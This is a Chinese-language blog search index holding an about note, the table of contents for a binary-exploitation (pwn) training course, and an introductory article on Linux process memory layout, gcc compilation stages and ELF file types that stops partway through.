<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于博客</title>
    <url>/2023/09/20/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h3><p><strong>主要用来记载Pwn、IOT和Linux&amp;Win内核等相关内容。有些文章内容都比较长，不太喜欢分块写。</strong></p>
<h3 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h3><p><strong>记录一些琐碎。</strong></p>
]]></content>
      <categories>
        <category>Archives</category>
      </categories>
  </entry>
  <entry>
    <title>课程上架看雪学苑</title>
    <url>/2024/01/19/%E8%AF%BE%E7%A8%8B%E4%B8%8A%E6%9E%B6%E7%9C%8B%E9%9B%AA%E5%AD%A6%E8%8B%91/</url>
    <content><![CDATA[<h1 id="课程目录"><a href="#课程目录" class="headerlink" title="课程目录"></a>课程目录</h1><p><strong>历时良久，精心制作的课程上架看雪学苑了</strong>!!! 讲师曾多次在全国以及国际CTF大赛获取奖项，也多次获得取证和大数据的奖项，也是多次参加红队护网。课程分为四部分，目录好多都包含了很多内容，写的简短些，比如<code>kernel pwn</code>的利用该和<code>heap</code>以及<code>IO_FILE</code>的利用等。目前<a class="link"   href="https://www.kanxue.com/book-leaflet-172.htm" >第一部分 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>已上线看雪学苑，主打一个硬核，并且未来还会在此课程中继续更新其他内容！</p>
<h2 id="Linux-pwn-探索篇"><a href="#Linux-pwn-探索篇" class="headerlink" title="Linux pwn 探索篇"></a>Linux pwn 探索篇</h2><p><a class="link"   href="https://www.kanxue.com/book-leaflet-172.htm" >课程链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<table>
<thead>
<tr>
<th><strong>linux user pwn 基础篇</strong></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>课程介绍</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程简介</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程目录</td>
</tr>
<tr>
<td></td>
<td></td>
<td>学习建议</td>
</tr>
<tr>
<td>2</td>
<td>环境搭建</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>3</td>
<td>二进制基础上</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>ELF文件</td>
</tr>
<tr>
<td></td>
<td></td>
<td>编译过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>链接</td>
</tr>
<tr>
<td></td>
<td></td>
<td>加载</td>
</tr>
<tr>
<td>4</td>
<td>二进制基础下</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>共享库</td>
</tr>
<tr>
<td></td>
<td></td>
<td>多线程与TLS</td>
</tr>
<tr>
<td></td>
<td></td>
<td>常见保护</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调用约定</td>
</tr>
<tr>
<td><strong>linux user pwn 栈篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>栈上的逻辑漏洞</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>2</td>
<td>ret2text</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>3</td>
<td>ret2shellcode</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>4</td>
<td>ret2syscall</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>5</td>
<td>ret2libc</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>6</td>
<td>ret2libc</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>7</td>
<td>stack_pivoting</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>8</td>
<td>ret2csu</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>9</td>
<td>ret2dl-resolve</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>10</td>
<td>ret2vDSO</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>11</td>
<td>SROP</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>12</td>
<td>BROP</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>13</td>
<td>沙箱及其绕过</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>13</td>
<td>侧信道攻击</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>14</td>
<td>stack_protector_bypass</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>15</td>
<td>格式化字符串漏洞</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn 堆篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>堆基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>堆基本操作</td>
</tr>
<tr>
<td></td>
<td></td>
<td>相关数据结构</td>
</tr>
<tr>
<td>2</td>
<td>堆基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>堆分配关键过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>源码解读</td>
</tr>
<tr>
<td>3</td>
<td>堆利用（持续更新）</td>
<td>这个部分将会持续更新，堆利用手法太多。包括how2heap全系列的讲解以及新的利用手段，每个手法都会单出视频进行原理和例题的解析</td>
</tr>
<tr>
<td><strong>linux user pwn IO_FILE篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>IO_FILE基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>IO_FILE简介</td>
</tr>
<tr>
<td></td>
<td></td>
<td>相关数据结构</td>
</tr>
<tr>
<td>2</td>
<td>IO_FILE基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础利用手法</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>3</td>
<td>IO_FILE利用（持续更新）</td>
<td>这个部分和堆篇一样持续更新，手法太多，讲解一些新老利用手法，每个手法单独出一个视频，原理和例题解析</td>
</tr>
</tbody></table>
<h2 id="Linux-pwn-精进篇"><a href="#Linux-pwn-精进篇" class="headerlink" title="Linux pwn 精进篇"></a>Linux pwn 精进篇</h2><table>
<thead>
<tr>
<th><strong>linux user pwn LLVM PASS PWN篇</strong></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>LLVM PASS PWN基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM IR</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM PASS</td>
</tr>
<tr>
<td>2</td>
<td>LLVM PASS PWN解析</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn 异构篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>ARM PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>2</td>
<td>AARCH64 PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>3</td>
<td>MIPS PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>4</td>
<td>PowerPC PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn musl pwn篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>musl pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基本数据结构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数分析</td>
</tr>
<tr>
<td>2</td>
<td>musl-1.2.0 pwn 堆利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>3</td>
<td>musl-1.2.3 pwn 堆利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>4</td>
<td>musl pwn IO_FILE 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td><strong>linux kernel pwn 基础篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核基础知识讲解</td>
</tr>
<tr>
<td>2</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核内存管理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核保护机制</td>
</tr>
<tr>
<td>3</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核环境搭建</td>
</tr>
<tr>
<td>4</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>linux内核模块开发</td>
</tr>
<tr>
<td><strong>linux kernel pwn 利用篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Kernel stack buffer oveflow</td>
</tr>
<tr>
<td>2</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>kernel Heap Expliot</td>
</tr>
<tr>
<td>3</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Race condition</td>
</tr>
<tr>
<td>4</td>
<td>kernel pwn 利用</td>
<td>kernel 常用结构体利用，这个部分持续更新一些 kernel 的新老利用手法</td>
</tr>
</tbody></table>
<h2 id="Windows-pwn-篇"><a href="#Windows-pwn-篇" class="headerlink" title="Windows pwn 篇"></a>Windows pwn 篇</h2><table>
<thead>
<tr>
<th>windows user pwn 基础篇</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>2</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数调用约定</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PE格式</td>
</tr>
<tr>
<td>3</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数调用约定</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PE格式及常见地址泄露方法</td>
</tr>
<tr>
<td>4</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows 异常处理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows IO_FILE</td>
</tr>
<tr>
<td>5</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows 异常处理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows IO_FILE</td>
</tr>
<tr>
<td>6</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Windows 堆概述</td>
</tr>
<tr>
<td>7</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>NT Heap</td>
</tr>
<tr>
<td>8</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap VS堆</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap LFH堆</td>
</tr>
<tr>
<td>9</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap 后端堆</td>
</tr>
<tr>
<td></td>
<td></td>
<td>segment heap LB堆</td>
</tr>
<tr>
<td><strong>windows user pwn 利用篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>stack overflower</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>32位栈溢出</td>
</tr>
<tr>
<td></td>
<td></td>
<td>64位栈溢出</td>
</tr>
<tr>
<td>2</td>
<td>ORW</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>32位ORW</td>
</tr>
<tr>
<td></td>
<td></td>
<td>64位ORW</td>
</tr>
<tr>
<td>3</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Unlink(NT 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>4</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>任意地址Malloc(NT heap 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>5</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Heap overlap(NT heap 后端heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>6</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>reuse attack(NT heap LFH heap)</td>
</tr>
<tr>
<td>7</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>double malloc(segment heap LFH heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>8</td>
<td>Heap Exploit</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>heap overlap(segment heap 后端 heap)</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
</tbody></table>
<h2 id="Pwn-番外篇"><a href="#Pwn-番外篇" class="headerlink" title="Pwn 番外篇"></a>Pwn 番外篇</h2><table>
<thead>
<tr>
<th>虚拟机逃逸篇</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 与 kvm架构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 虚拟化</td>
</tr>
<tr>
<td>2</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PCI 设备</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu object model</td>
</tr>
<tr>
<td>3</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 设备分析过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 常见函数</td>
</tr>
<tr>
<td>4</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 设备分析过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 常见函数</td>
</tr>
<tr>
<td>5</td>
<td>qemu 逃逸</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>qemu 逃逸实战</td>
</tr>
<tr>
<td><strong>浏览器Pwn篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础知识介绍</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>2</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>浏览器常用的class</td>
</tr>
<tr>
<td></td>
<td></td>
<td>v8的object通用结构体</td>
</tr>
<tr>
<td>3</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>常见类型结构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
<tr>
<td>4</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>heap sandbox</td>
</tr>
<tr>
<td>5</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Justin Time Compiler</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
<tr>
<td>6</td>
<td>浏览器Pwn</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>hole</td>
</tr>
<tr>
<td></td>
<td></td>
<td>实战</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Archives</category>
      </categories>
  </entry>
  <entry>
    <title>深入理解Pwn_Base_knowledge</title>
    <url>/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/</url>
    <content><![CDATA[<h1 id="Linux进程布局及ELF文件结构"><a href="#Linux进程布局及ELF文件结构" class="headerlink" title="Linux进程布局及ELF文件结构"></a>Linux进程布局及ELF文件结构</h1><p>这里的讲解并不是很深入，只是浅浅的做了些提示，本文内容是原本准备讲课的提示词，现在在做课程升级，就把之前想要讲课用的内容放在这里。</p>
<h2 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h2><p>操作系统加载可执行文件后，创建了一个进程，这个进程就有了自己的虚拟地址空间，每个进程的虚拟地址空间都一样。</p>
<h2 id="Linux-进程布局"><a href="#Linux-进程布局" class="headerlink" title="Linux 进程布局"></a>Linux 进程布局</h2><h3 id="32位布局"><a href="#32位布局" class="headerlink" title="32位布局"></a>32位布局</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32.png"
                      alt="x32"
                ></p>
<ul>
<li><code>Kernel space</code>：<code>0xFFFFFFFF-&gt;0xC0000000</code> 这 <code>1GB</code> 大小的空间被分为内核空间，用户进程无法直接访问内核的虚拟内存空间，仅能通过系统调用来进入内核态，从而来访问指定的内核空间地址。</li>
<li><code>Stack</code>：在用户空间的最顶部的部分被叫做栈空间，它一般用于存放函数参数或局部变量，进程中的每一个线程都有属于自己的栈栈由高地址向低地址增长。</li>
<li><code>Mmap</code>：内核将文件内容映射在此这里，例如加载动态链接库。另外，在 <code>Linux</code> 中，如果你通过 <code>malloc</code> 函数申请一块大于<code>MMAP_THRESHOLD</code> (默认为128KB)大小的堆空间时，<code>glibc</code> 会返回一块匿名的 <code>mmap</code> 内存块而非一块堆内存，也就是匿名映射。</li>
<li><code>Heap</code>：堆同栈一样，都是为进程运行提供动态的内存分配，但其和栈的的一个很大区别在于堆上内存的生命期和执行分配的函数的生命期不一致，堆上分配的内存只有在对应进程通过系统调用主动释放或进程结束后才会释放。</li>
<li><code>BSS</code>：用来存放未初始化的全局或静态变量，程序加载时初始化为 <code>0</code>。</li>
<li><code>Data</code>：用来存放初始化的全局或者静态变量。</li>
<li><code>Text</code>：这段中存有程序的指令代码。<code>Text</code> 段是通过只读的方式加载到内存中的，他在多个进程中是可以被安全共享的。</li>
<li><code>0x00000000~0x80480000</code>：<code>Reserve</code>（保留区），用户不可访问。</li>
</ul>
<h3 id="x64进程布局"><a href="#x64进程布局" class="headerlink" title="x64进程布局"></a>x64进程布局</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64.png"
                      alt="x64"
                ></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *data = <span class="string">&quot;hello data&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a==&gt;%d, b==&gt;%d&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="二进制简介"><a href="#二进制简介" class="headerlink" title="二进制简介"></a>二进制简介</h2><p>计算机使用二进制系统执行计算，系统执行的机器码被称为二进制代码，二进制文件包含每个程序的所有代码和数据。</p>
<h3 id="C语言编译过程"><a href="#C语言编译过程" class="headerlink" title="C语言编译过程"></a>C语言编译过程</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/image-20231109145303530.png"
                      alt="image-20231109145303530"
                ></p>
<ul>
<li><strong>预处理阶段</strong>：处理<code>#define</code>和<code>#include</code>指令。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -E -P compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>编译阶段</strong>：将纯C代码转换为汇编语言，编译器优化。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -S -masm=intel compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>汇编阶段</strong>：将汇编代码转换成机器码，生成可重定位的二进制文件。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -c compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>链接阶段</strong>：将所有对象文件链接到一个二进制可执行文件，静态库合并到二进制可执行文件，留下符号引用，被动态链接器用来解析动态库的最终依赖关系。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc compilation_example.c</span><br></pre></td></tr></table></figure></div>

<p>源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT <span class="string">&quot;%s&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE <span class="string">&quot;Hello, World\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(FORMAT, MESSAGE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p><a class="link"   href="https://www.man7.org/linux/man-pages/man5/elf.5.html" >源码网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/ELF.png"
                      alt="ELF"
                ></p>
<p><strong>ELF分类</strong></p>
<ul>
<li><code>ET_NONE</code>：未知类型。这个标记表明文件类型不确定，或者还未定义。</li>
<li><code>ET_REL</code>：重定位文件。ELF 类型标记为 <code>relocatable</code> 意味着该文件 被标记为了一段可重定位的代码，有时也称为目标文件。可重定位 目标文件通常是还未被链接到可执行程序的一段位置独立的代码 （position independent code）。在编译完代码之后通常可以看到一 个.o 格式的文件，这种文件包含了创建可执行文件所需要的代码 和数据。</li>
